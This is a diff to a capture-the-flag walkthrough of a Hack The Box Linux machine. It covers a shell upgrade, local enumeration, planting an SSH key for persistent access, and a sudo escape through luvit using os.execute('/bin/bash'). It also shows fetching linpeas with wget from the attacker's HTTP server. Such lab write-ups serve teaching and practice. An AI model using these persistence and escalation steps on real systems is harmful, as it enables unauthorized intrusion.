@@ -128,5 +128,119 @@ All that needs changing in the ip address and port to match our own on the HTB n
 
 And we are in. We are webadmin on the server. From here we need to escalate our privileges until we become root.
 
+### Upgrading our Shell
 
+The shell that we have gained so far isn't the best we could make it. I would much rather have a tty shell and tab auto complete to make our QoL a lot better. To do this we simply type into our shell:
+
+```text
+python3 -c "import pty;pty.spawn('bin/bash')"
+```
+
+from here we press ctrl + z. And then type stty raw -echo into our command line and then press fg.
+
+What this is doing is using the fact that we have python installed on the victim to spawn a more interactive shell. By pressing ctrl + z we background our current connection to the shell. The "stty raw -echo" part allows us to pipe our type input into the shell. And from there the "fg" which you will not be able to see yourself type into the command line after typing "stty war -echo" brings back the shell into the foreground. From here we now have tab auto complete and colour sensitive output.
+
+### User PrivEsc
+
+Now that we have a basic user shell on the machine it is time to do some basic enumeration. My usuall first few commands that I always eneter on a linux machine are as follows:
+
+* [ ] whoami
+* [ ] hostname
+* [ ] history
+* [ ] uname -a
+* [ ] sudo -l
+* [ ] sudo su
+* [ ] netstat -ano
+
+These commands allow me to get a general basic understanding of what the user I am connected as has access to and is able to do on the victim machine. 
+
+In this case we are connected as webadmin and therefore do not have many rights.
+
+using ls to look at the current folder we see that there is not much in our current folder apart from a picture, the index page code and the webshell we used to connect.
+
+My next step is usually to go look at the home folder of the current user. Going there we see that there are two users in the /home directory.
+
+![ls /home output](.gitbook/assets/vmplayer_w1fonrnvhd.png)
+
+Moving into webadmin, we see that someone has left a note here. Reading it, it says
+
+![](.gitbook/assets/vmplayer_eonycacpwh.png)
+
+This seems interesting so we will come back to this later.
+
+But first we need to make our shell more stable. When looking at hidden files using ls -la we see that we can write to the .ssh file. This means that we can add ourselves to the list of authroized connections that are able to connect as webadmin to this machine through the ssh service we found to be open during our initial enumeration.
+
+![](.gitbook/assets/vmplayer_svqbjwqgrv.png)
+
+To do this we generate a fresh public key on our machine to give to the victim machine.
+
+```text
+ssh-keygen
+```
+
+Copy the output of this command over into ~/.ssh/authorized\_keys file and into a local file that you can access.
+
+From here we can now ssh into the machine using the ssh key.
+
+```text
+ssh -i id_rsa webadmin@10.10.10.181
+```
+
+This command connects us using ssh to the machine as the user webadmin at the ip address of 10.10.10.181 using the public key copied from the above command into a local file called id\_rsa.
+
+Now that we have a more stable shell we can go back to looking how to privEsc. Looking at the history command output
+
+![history command output](.gitbook/assets/vmplayer_ym4aw6kl3x.png)
+
+We can see that sudo is used to run `/home/sysadmin/luvit` as `sysadmin`.
+
+#### Sudo -l
+
+By using the command `sudo -l` we can enumerate out current users sudo permissions
+
+![sudo -l output](.gitbook/assets/vmplayer_emk1qdszec.png)
+
+From this commands output we can see that it is possible to run `/home/sysadmin/luvit` without any password being required.
+
+#### GTFO bins
+
+GTFO bins is a great website that has a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+To privEsc here we will be using the lua section of GTFO bins
+
+![Lua GTFO bins https://gtfobins.github.io/gtfobins/lua/](.gitbook/assets/firefox_52pde3sjuo.png)
+
+Using what we can see from gtfo bins there is two ways we can do this. The first is to make a file with `os.execute('/bin/bash')` command in it and execute it using Luvit as was shown in the history output. Or we can use Luvit repl to just directly execute it.
+
+![pivoting to become sysadmin user](.gitbook/assets/vmplayer_msudxhjtsj.png)
+
+#### Shell as sysadmin
+
+Moving into the sysadmin directory we can see the user.txt flag.
+
+![sysadmin directory contents](.gitbook/assets/vmplayer_uukgwj458c.png)
+
+As the .ssh directory is owned by root we are unable to replicate the way we gained access to webadmin using ssh to connect. Look like we will have to find another way to privEsc.
+
+### PrivEsc to Root
+
+Specifically for PrivEsc I have a transfer folder on my kali machine full of usefull tools that I might want to transfer over to a target machine to help me to privEsc it quicker. Here I will transfer over two files, linpeas and pspy.
+
+This is done by creating a python server on our kali machine using the command
+
+```text
+python -m SimpleHTTPServer 80
+```
+
+To download the files onto the target machine we use 
+
+```text
+wget http://10.10.14.21:80/linpeas.sh
+```
+
+where the ip address is our own ip address on the HTB network, the port number is the port number used from the python command above and then the name of the file.
+
+When running both tools we see a file updating every minute, which looked like a Cron restoring /etc/update-motd.d/.
+
+![](.gitbook/assets/vmplayer_vnz5uo4nuo.png)
 
